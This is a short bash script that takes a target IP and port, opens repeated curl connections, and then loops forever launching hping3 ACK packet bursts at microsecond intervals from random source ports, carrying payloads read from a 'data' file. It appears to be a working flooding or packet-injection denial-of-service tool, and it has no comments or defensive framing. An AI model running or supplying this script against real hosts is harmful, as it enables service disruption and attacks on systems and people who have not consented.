#!/bin/bash

if [ "$#" -lt 2 ]; then
    echo "Usage: ./script.sh <ip> <port> [delay]"
    exit
fi

trap 'kill $(jobs -p); exit' SIGINT

pkill -9 curl
srcprt=$(shuf -i 20000-50000 -n 1)
dstprt=$2
delay=$3

if [ -z "$3" ]; then
    delay=0.5
fi

echo "Using delay of $delay"

curl $1:$2 &
sleep $delay
curl $1:$2 &
sleep $delay
curl $1:$2 &
sleep $delay
curl $1:$2 &
sleep $delay
curl $1:$2 &
sleep $delay
curl $1:$2 &
sleep $delay
curl $1:$2 &
sleep $delay
curl $1:$2 &
sleep $delay
curl $1:$2 &
sleep $delay
curl $1:$2 &
sleep $delay
curl $1:$2 &
sleep $delay
curl $1:$2 &
sleep $delay
curl --local-port $srcprt $1:$2 &
sleep $delay

COUNTER=2
until [ $COUNTER -lt 1 ]; do
    srcprt=$(shuf -i 20000-50000 -n 1)
    curl --local-port $srcprt $1:$2 </dev/null &>/dev/null &
    len=$(shuf -i 500-1100 -n 1)
    hping3 -i u1 -q -s $srcprt --keep -d $len -A -p $2 -w 192 -E data $1 </dev/null &>/dev/null &
    hpid=$!
    sleep 0.5
    kill -9 $hpid &>/dev/null
    let COUNTER+=1
done
